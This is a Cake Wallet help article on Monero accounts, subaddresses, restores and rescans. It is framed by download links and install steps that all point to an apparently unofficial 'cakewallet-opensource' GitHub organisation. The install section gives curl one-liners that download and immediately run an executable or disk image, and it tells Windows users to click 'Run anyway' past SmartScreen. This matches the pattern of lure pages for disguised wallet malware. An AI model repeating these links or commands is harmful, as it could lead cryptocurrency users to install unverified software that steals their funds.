![Cake Wallet monero accounts subaddresses guide](assets/cake-wallet-monero-accounts-subaddresses-article-banner.png)

# Monero Accounts and Subaddresses in Cake Wallet

Three levels that explain why a restored wallet can look empty.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

A wallet holds accounts, and an account holds subaddresses. Funds sent to a subaddress still belong to the account above it, which is why the wrong account being open looks like a missing deposit. The wallet's phrase covers all of them, and a rescan rebuilds every account at once.

<!-- ARTICLE-BODY-BEGIN -->

## How the three levels differ
A wallet is the container with its own recovery phrase. Inside it, Monero accounts separate activity, and each account generates subaddresses for receiving. Subaddresses are not separate wallets: they share the account's balance and its keys.

That structure is Monero's, not Cake Wallet's, and it exists so you can give out an address per payment without exposing one address for everything. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md">Manage multiple wallets in Cake Wallet</a> covers the level above, where separate phrases and separate balances begin.

## Creating another account
Open the Monero wallet, find the accounts section, and add an account with a name you will recognise. It generates its own subaddresses immediately, and the wallet's balance view changes to show the selected account rather than the whole wallet.

Naming matters more than it seems: an account called "savings" is easier to return to than "account 2" three months later. The name lives only on the device and is not part of the chain.

## Receiving into the right place
Give the sender a subaddress from the account you want the funds in, not from whichever account is open at the time. A deposit to another account's subaddress will not appear in the current view, and no error is shown anywhere: the funds simply arrive somewhere else.

That is the single most common false alarm in Monero. Before reporting a missing deposit, switch accounts and look.

## Restoring into the right account
A restore recreates the wallet and all its accounts from the phrase; it does not ask you to rebuild the structure by hand. The account names may need re-entering, but the addresses and their history come back.

<a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">Restore a Cake Wallet wallet</a> covers the phrase route and the 25-word Monero case, where the seed type has to be selected correctly for the accounts to appear at all.

## When a rescan is needed
If an account is genuinely missing transactions after a completed sync, the wallet's local history is wrong rather than the chain. A rescan rebuilds every account at once, so one expensive pass covers all of them.

Do not rescan for an account that is merely not selected. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-rescan.md">Rescan the Monero blockchain</a> covers when the tool helps, and why the restore height decides how long it takes.

## Current release
Account and subaddress behaviour is stable but the menu changes, so use the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> when you set up a structure you will rely on. Restoring later on a different build is easier when the layout matches.

If the accounts section is missing entirely, check that you are in a Monero wallet and not in another coin's wallet that has no accounts.

## FAQ
### What is the difference between wallets, accounts and subaddresses?
A wallet has its own phrase; accounts split a wallet's activity; subaddresses are receive addresses inside an account.
### How do I create a new Monero account?
From the Monero wallet's accounts section, add an account and name it. It gets its own subaddresses immediately.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[manage multiple wallets in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md) · [restore a Cake Wallet wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [rescan the Monero blockchain](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-rescan.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
